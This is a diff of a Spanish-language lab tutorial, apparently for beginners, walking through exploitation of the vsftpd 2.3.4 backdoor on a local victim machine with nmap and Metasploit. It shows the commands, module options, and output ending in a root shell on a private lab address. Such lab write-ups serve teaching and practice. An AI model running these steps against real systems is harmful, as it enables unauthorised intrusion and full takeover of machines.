@@ -52,7 +52,7 @@ hagamoslo con el ip nuestro.
 </p>
 Bien, veremos una maquina que tiene varios puertos abierto, esa debe ser la máquina victima.
 
-Si observamos podemos ver que tiene varios puertos abiertos, hagamos un escaneo con nmap para ver que versiones de estos puertos tienen, usamos la bandera -sV
+Si observamos podemos ver que tiene varios puertos abiertos, hagamos un escaneo con nmap para ver que versiones de estos puertos tienen, usamos la bandera "-sV"
   ```sh
   nmap -sV (IP de la maquina victima)
   ```
@@ -73,4 +73,72 @@ Empezara a cargar Metasploit.
 <p align="left">
   <img src="https://i.postimg.cc/d3zDxWBw/imagen-2024-09-16-234723216.png" width="75%" height="75%" align="">
 </p>
-Bien
+Bien, ahora usaremos un comando dentro de Metasploit, la cual nos ayudara a poder buscar dentro de sus modulos una vulnerabilidad que tenga. Este comando es "search", usemoslo con la version que encontramos.
+  ```sh
+  search vsftpd 2.3.4
+  ```
+<p align="left">
+  <img src="https://i.postimg.cc/XJ2cP0mF/imagen-2024-09-16-235901481.png" width="75%" height="75%" align="">
+</p>
+Bien, nos muestra un resultado el cual nos ayudara, usemos el comando "use" para poder usarlo (valga la rebundancia XD).
+  ```sh
+  $  use 0
+  ```
+Nos mostrara esto
+  ```sh
+  [*] No payload configured, defaulting to cmd/unix/interact
+  msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+  ```
+La parte que dice "No payload configured" la dejaremos asi, ya que en si ya esta configurado para UNIX. Que viene por defecto.
+
+Ahora, configuremos el exploit, veamos las opciones que tiene con el comando "options".
+  ```sh
+  msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options
+
+  Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+     Name     Current Setting  Required  Description
+     ----     ---------------  --------  -----------
+     CHOST                     no        The local client address
+     CPORT                     no        The local client port
+     Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+     RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+     RPORT    21               yes       The target port (TCP)
+
+
+  Payload options (cmd/unix/interact):
+
+     Name  Current Setting  Required  Description
+     ----  ---------------  --------  -----------
+
+
+  Exploit target:
+
+     Id  Name
+     --  ----
+     0   Automatic
+  
+
+
+  View the full module info with the info, or info -d command.
+  ```
+Nos muestra esto, vamos a colocar la ip de la maquina victima para poder ejecutar el exploit, usemos el comando "set" y para que ira, en este caso para RHOSTS.
+  ```sh
+  msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.79.128
+  RHOSTS => 192.168.79.128
+  ```
+Bien, dice que ya esta colocado, ahora ejecutemos el exploit con el comando "exploit" o "run", cualquiera de los dos sirve.
+  ```sh
+  msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+  [*] 192.168.79.128:21 - Banner: 220 (vsFTPd 2.3.4)
+  [*] 192.168.79.128:21 - USER: 331 Please specify the password.
+  [+] 192.168.79.128:21 - Backdoor service has been spawned, handling...
+  [+] 192.168.79.128:21 - UID: uid=0(root) gid=0(root)
+  [*] Found shell.
+  [*] Command shell session 1 opened (192.168.79.133:44365 -> 192.168.79.128:6200) at 2024-09-17 01:13:05 -0400
+  ```
+Nos dice que funciono, ahora podemos ver el contenido.
+
+## OJO:
+Recordemos las carpetas Raiz, las cuales son "/etc", "/bin", "/share" y "/home", cada una tiene cosas que nos ayuda a organizar cada cosa, como "/home". El cual contiene los usuarios, posiblemente en otra carpeta llamada "users" o puede que no. Ya es cosa de verificar.
